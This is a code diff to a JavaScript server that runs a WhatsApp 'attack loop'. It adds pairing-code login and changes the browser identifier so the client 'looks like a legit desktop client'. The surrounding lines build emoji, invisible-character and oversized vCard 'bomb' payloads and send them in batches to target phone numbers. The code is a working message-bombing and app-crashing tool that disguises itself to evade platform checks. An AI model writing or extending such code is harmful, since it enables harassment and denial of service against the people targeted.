@@ -1,5 +1,5 @@
 // stateless_server.js
-// VERSION: GHOST-V2-UNICODE-FIX
+// VERSION: GHOST-V3-PAIRING-CODE
 // TIMESTAMP: ${new Date().toISOString()}
 
 import { Server } from "npm:socket.io";
@@ -105,6 +105,21 @@ io.on("connection", (socket) => {
         }
     });
 
+    // --- NEW: PAIRING CODE HANDLER ---
+    socket.on("use_pairing_code", async (phoneNumber) => {
+        if (!activeSock) {
+            return socket.emit("error", "Socket not initialized. Connect first.");
+        }
+        try {
+            console.log(`[*] Requesting pairing code for ${phoneNumber}`);
+            const code = await activeSock.requestPairingCode(phoneNumber);
+            socket.emit("pairing_code", code);
+        } catch (e) {
+            console.error("Pairing Error:", e);
+            socket.emit("error", "Pairing Failed: " + e.message);
+        }
+    });
+
     socket.on("attack_start", async (targets) => {
         if (!activeSock) return socket.emit("error", "WA Not Connected");
         runAttackLoop(socket, targets);
@@ -128,9 +143,13 @@ async function startSock(socket, initialData) {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
-        browser: ["MALXGMN", "Chrome", "1.0.0"],
+        // Browser config to look like a legit desktop client
+        browser: ["Chrome (Linux)", "", ""], 
         generateHighQualityLinkPreview: true,
     });
+
+    // IMPORTANT: Assign activeSock IMMEDIATELY so pairing code works
+    activeSock = sock;
 
     sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect, qr } = update;
@@ -148,7 +167,6 @@ async function startSock(socket, initialData) {
                 socket.emit('logged_out', 'Session Invalidated');
             }
         } else if (connection === 'open') {
-            activeSock = sock;
             socket.emit('ready', 'WhatsApp Connected');
         }
     });
@@ -160,13 +178,12 @@ async function runAttackLoop(socket, rawTargets) {
     isAttacking = true;
     const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
     
-    // --- PAYLOADS (STRICTLY NO EMOJI LITERALS) ---
-    const _f = "\\uD83D\\uDD25"; // FIRE
-    const _s = "\\u2620\\uFE0F"; // SKULL
-    const _b = "\\uD83D\\uDCA3"; // BOMB
-    const _i = "\\u200e\\u200f"; // INVISIBLE
+    // --- PAYLOADS (UNICODE SAFE) ---
+    const _f = "\\uD83D\\uDD25"; 
+    const _s = "\\u2620\\uFE0F"; 
+    const _b = "\\uD83D\\uDCA3"; 
+    const _i = "\\u200e\\u200f"; 
 
-    // VCARD BOMB
     let heavyVcardContent = '';
     const vcardHeader = 'BEGIN:VCARD\nVERSION:3.0\nFN:';
     const vcardFooter = '\nTEL;type=CELL;waid=0:0\nEND:VCARD\n';
@@ -192,7 +209,7 @@ async function runAttackLoop(socket, rawTargets) {
             await Promise.all(batchTasks);
             
             socket.emit('attack_progress', { count: counter });
-            await delay(500); // Slow down to prevent CPU Kill
+            await delay(500); 
         } catch (e) {
             await delay(1000);
         }
